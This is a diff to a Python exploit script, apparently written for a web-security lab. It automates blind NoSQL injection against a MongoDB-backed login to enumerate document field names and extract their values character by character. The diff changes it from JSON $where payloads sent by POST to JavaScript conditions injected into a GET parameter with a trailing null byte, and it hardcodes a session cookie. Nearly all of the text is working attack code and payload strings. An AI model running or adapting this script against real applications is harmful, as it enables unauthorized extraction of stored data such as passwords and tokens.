@@ -2,6 +2,7 @@
 
 from pwn import *
 import requests, signal, time, pdb, sys, string, argparse, urllib3
+from urllib.parse import urlencode, quote_plus
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -15,8 +16,8 @@ def initialize_session(proxy_url, verify_ssl):
     session = requests.Session()
     
     session.headers.update({
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Cookie': 'session=uBWvqeketsfzMA5exE3LyNg8LMbDF9Pp'
     })
     
     if proxy_url:
@@ -34,18 +35,18 @@ def initialize_session(proxy_url, verify_ssl):
 
 def make_request(session, url, payload):
     try:
-        response = session.post(
-            url,
-            json=payload,
+        encoded_payload = quote_plus(payload, safe='')
+        response = session.get(
+            f"{url}{encoded_payload}%00",
             timeout=300,
             allow_redirects=False
         )
-        return response.status_code == 302
+        return "wiener" in response.text
     except requests.exceptions.RequestException as e:
         log.error(f"Error during request: {e}")
         return False
 
-def escape_character(character):
+def escape_regex_character(character):
     if character == '\\':
         return '\\\\\\\\'
     elif character in '.^$*+?{}[]|()':
@@ -58,15 +59,9 @@ def get_number_of_fields(session, url):
     
     count = 0
     while True:
-        payload = {
-            "username": "wiener",
-            "password": {
-                "$ne": None
-            },
-            "$where": f"function(){{ if (Object.keys(this).length=={count}) return 1; else return 0; }}"
-        }
+        payload = f"wiener' && Object.keys(this).length=={count}"
         
-        progress_bar.status(payload["$where"])
+        progress_bar.status(payload)
         
         if make_request(session, url, payload):
             log.success(f"Fields found: {count}")
@@ -84,15 +79,9 @@ def get_field_lengths(session, url, total_fields):
         current_length = 0
         
         while True:
-            payload = {
-                "username": "wiener",
-                "password": {
-                    "$ne": None
-                },
-                "$where": f"function(){{ if (Object.keys(this)[{current_field_index}].length=={current_length}) return 1; else return 0; }}"
-            }
+            payload = f"wiener' && Object.keys(this)[{current_field_index}].length=={current_length}"
             
-            progress_bar.status(payload["$where"])
+            progress_bar.status(payload)
             
             if make_request(session, url, payload):
                 field_lengths_list.append(current_length)
@@ -124,17 +113,11 @@ def get_field_names(session, url, field_lengths_list):
             character_found = None
             
             for character in characters:
-                character = escape_character(character)
+                escaped_character = escape_regex_character(character)
                 
-                payload = {
-                    "username": "wiener",
-                    "password": {
-                        "$ne": None
-                    },
-                    "$where": f"function(){{ if (Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{character}.*')) return 1; else return 0; }}"
-                }
+                payload = f"wiener' && Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{escaped_character}.*')"
                 
-                progress_bar.status(payload["$where"])
+                progress_bar.status(payload)
                 
                 if make_request(session, url, payload):
                     extracted_field_name += character
@@ -168,15 +151,9 @@ def get_field_value_lengths(session, url, field_names_list, field_indexes):
         current_value_length = 0
         
         while True:
-            payload = {
-                "username": "wiener",
-                "password": {
-                    "$ne": None
-                },
-                "$where": f"function(){{ if (this.{current_field_name}.valueOf().toString().length=={current_value_length}) return 1; else return 0; }}"
-            }
+            payload = f"wiener' && this.{current_field_name}.valueOf().toString().length=={current_value_length}"
             
-            progress_bar.status(payload["$where"])
+            progress_bar.status(payload)
             
             if make_request(session, url, payload):
                 field_value_lengths[current_field_name] = current_value_length
@@ -215,17 +192,11 @@ def get_field_value_names(session, url, field_names_list, field_value_lengths, f
             character_found = None
             
             for character in characters:
-                character = escape_character(character)
+                escaped_character = escape_regex_character(character)
                 
-                payload = {
-                    "username": "wiener",
-                    "password": {
-                        "$ne": None
-                    },
-                    "$where": f"function(){{ if (this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{character}.*')) return 1; else return 0; }}"
-                }
+                payload = f"wiener' && this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{escaped_character}.*')"
                 
-                progress_bar.status(payload["$where"])
+                progress_bar.status(payload)
                 
                 if make_request(session, url, payload):
                     extracted_field_value += character
@@ -347,7 +318,7 @@ def main(url, proxy_url=None, verify_ssl=True, output_file='fields.txt'):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
-        description='MongoDB Fields Enumeration via NoSQL Injection',
+        description='MongoDB Fields Enumeration via NoSQL Injection (GET Method)',
         add_help=False
     )
     
